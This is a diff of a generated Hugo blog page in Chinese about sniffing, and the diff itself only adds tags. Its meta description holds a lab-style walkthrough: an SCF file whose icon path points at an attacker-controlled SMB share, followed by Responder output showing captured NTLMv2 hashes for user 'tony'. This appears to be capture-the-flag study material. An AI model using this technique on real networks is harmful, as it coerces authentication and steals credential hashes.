@@ -11,7 +11,7 @@ SCF 文件是一种 Windows Shell 文件，用于执行特定的的系统命令�
 创建一个 SCF 文件，访问一个不存在的 smb 地址，这样会导致解析协议降级到 nbt-ns 或 llmnr，可能触发 ntlm 认证，如何做中间人攻击。
 ┌──(kali㉿kali)-[~/Work/Kali] └─$ cat enil.scf [Shell] Command=2 IconFile=\\10.10.16.155\enil [Taskbar] Command=Test 使用 responder 监听。
 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo responder -I tun0 -v __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0 To support this project: Github -&gt; https://github.com/sponsors/lgandx Paypal -&gt; https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [&#43;] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [OFF] [&#43;] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] MQTT server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON] SNMP server [OFF] WinRM server [ON] 09:03:10 [65/185] SNMP server [OFF] [&#43;] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [&#43;] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Force ESS downgrade [OFF] [&#43;] Generic Options: Responder NIC [tun0] Responder IP [10.10.16.155] Responder IPv6 [dead:beef:4::1099] Challenge set [random] Don&#39;t Respond To Names [&#39;ISATAP&#39;, &#39;ISATAP.LOCAL&#39;] Don&#39;t Respond To MDNS TLD [&#39;_DOSVC&#39;] TTL for poisoned response [default] [&#43;] Current Session Variables: Responder Machine Name [WIN-V5VWOPA0X2M] Responder Domain Name [14SQ.LOCAL] Responder DCE-RPC Port [47012] [&#43;] Listening for events... [SMB] NTLMv2-SSP Client : 10.129.5.91 [SMB] NTLMv2-SSP Username : DRIVER\tony [SMB] NTLMv2-SSP Hash : tony::DRIVER:0f3d3a4556180c16:758A05F61A29B2766216AF2F45589E87:010100000000000080C02DF790A8DC01281DCEA0B2A88BC70000000002000800310034005300510001001E00570049004E002D0 056003500560057004F00500041003000580032004D0004003400570049004E002D0056003500560057004F00500041003000580032004D002E0031003400530051002E004C004F00430041004C000300140031003400530051002E004C004F004 30041004C000500140031003400530051002E004C004F00430041004C000700080080C02DF790A8DC0106000400020000000800300030000000000000000000000000200000AB616315500E1852C7379E562BF5F4BC1F8EF92EBBB6C4BB59DF47D 652564A5B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310035003500000000000000000000000000 [SMB] NTLMv2-SSP Client : 10.129.5.91 [SMB] NTLMv2-SSP Username : DRIVER\tony [SMB] NTLMv2-SSP Hash : tony::DRIVER:ca21e3e89051ede8:D478E52273860FCB0164A9E6AD33785E:010100000000000080C02DF790A8DC0115D2FD48156979C80000000002000800310034005300510001001E00570049004E002D0 056003500560057004F00500041003000580032004D0004003400570049004E002D0056003500560057004F00500041003000580032004D002E0031003400530051002E004C004F00430041004C000300140031003400530051002E004C004F004 30041004C000500140031003400530051002E004C004F00430041004C000700080080C02DF790A8DC0106000400020000000800300030000000000000000000000000200000AB616315500E1852C7379E562BF5F4BC1F8EF92EBBB6C4BB59DF47D 652564A5B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310035003500000000000000000000000000 " />
-<meta name="keywords" content=", Hack" />
+<meta name="keywords" content=", Hack, 技术, Responder" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
 <link rel="canonical" href="http://localhost:1313/tools/%E5%97%85%E6%8E%A2/" />
@@ -52,7 +52,7 @@ SCF 文件是一种 Windows Shell 文件，用于执行特定的的系统命令�
   <meta itemprop="datePublished" content="2026-03-01T17:00:00+08:00">
   <meta itemprop="dateModified" content="2026-03-01T17:00:00+08:00">
   <meta itemprop="wordCount" content="294">
-  <meta itemprop="keywords" content="Hack">
+  <meta itemprop="keywords" content="Hack,技术,Responder">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="嗅探">
@@ -248,6 +248,8 @@ SCF 文件是一种 Windows Shell 文件，用于执行特定的的系统命令�
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
 
         <span class="tag"><a href="http://localhost:1313/tags/hack/">Hack</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/%E6%8A%80%E6%9C%AF/">技术</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/responder/">Responder</a></span>
         
     </p>
 
